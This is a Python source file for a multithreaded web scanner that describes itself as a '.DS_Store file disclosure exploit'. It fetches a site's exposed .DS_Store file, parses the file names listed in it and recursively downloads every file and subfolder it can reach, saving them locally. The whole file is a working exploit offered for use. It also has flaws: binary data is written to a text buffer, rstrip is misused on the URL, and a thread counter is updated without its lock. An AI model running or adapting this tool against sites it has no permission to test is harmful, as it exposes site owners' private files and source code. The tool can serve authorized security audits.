#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

# LiJiejie  my[at]lijiejie.com    http://www.lijiejie.com
# Virink    virink@outlook.com    https://www.virzz.com


import sys
import io
import os
import queue as Queue
import threading
import urllib.parse
import requests as req

from ds_store import DSStore


class Scanner(object):

    def __init__(self, start_url):
        self.queue = Queue.Queue()
        self.queue.put(start_url)
        self.processed_url = set()
        self.lock = threading.Lock()
        self.working_thread = 0
        self.result = []

    def process(self):
        while True:
            try:
                url = self.queue.get(timeout=2.0)
                self.lock.acquire()
                self.working_thread += 1
                self.lock.release()
            except Exception as e:
                if self.working_thread == 0:
                    break
                else:
                    continue
            try:
                if url in self.processed_url:
                    pass
                else:
                    self.processed_url.add(url)
                base_url = url.rstrip('.DS_Store')
                if not url.lower().startswith('http'):
                    url = 'http://%s' % url
                schema, netloc, path, _, _, _ = urllib.parse.urlparse(
                    url, 'http')
                res = req.get(url, timeout=5,)
                if res.status_code == 200:
                    data = res.content
                    folder_name = netloc.replace(
                        ':', '_') + '/'.join(path.split('/')[:-1])
                    if not os.path.exists(folder_name):
                        os.makedirs(folder_name)
                    with open(netloc.replace(':', '_') + path, 'wb') as outFile:
                        self.lock.acquire()
                        print('\033[1;32;40m[+] \033[1;34;40m%s\033[0m' % url)
                        self.result.append('[+] %s' % url)
                        self.lock.release()
                        outFile.write(data)
                    if url.endswith('.DS_Store'):
                        ds_store_file = io.StringIO()
                        ds_store_file.write(data)
                        d = DSStore.open(ds_store_file)
                        dirs_files = set()
                        for x in d.traverse():
                            dirs_files.add(x.filename)
                        for name in dirs_files:
                            if name != '.':
                                self.queue.put(base_url + name)
                                self.queue.put(base_url + name + '/.DS_Store')
                        d.close()
                        print("\033[1;36;40m[DS_Store] \033[1;35;40m%s\033[0m" %
                              ','.join(dirs_files))
                        self.result.append('[DS_Store] %s' % url)
                elif res.status_code == 403:
                    self.lock.acquire()
                    print(
                        '\033[1;31;40m[Folder Found] \033[1;33;40m%s\033[0m' % url)
                    self.result.append('[Folder Found] %s' % url)
                    self.lock.release()
                    continue
            except:
                pass
            finally:
                self.working_thread -= 1

    def scan(self):
        all_threads = []
        for i in range(10):
            t = threading.Thread(target=self.process)
            all_threads.append(t)
            t.start()


def ds_store_scan(url):
    if ".DS_Store" not in url:
        url = url + "/.DS_Store"
    s = Scanner(url)
    s.scan()
    while s.working_thread > 0:
        continue
    return s.result

if __name__ == '__main__':
    if len(sys.argv) == 1:
        print('A .DS_Store file disclosure exploit. By LiJieJie')
        print
        print('It parse .DS_Store and download file recursively.')
        print
        print('\tUsage: python ds_store_exp.py http://www.example.com/.DS_Store')
        sys.exit(0)
    s = Scanner(sys.argv[1])
    s.scan()
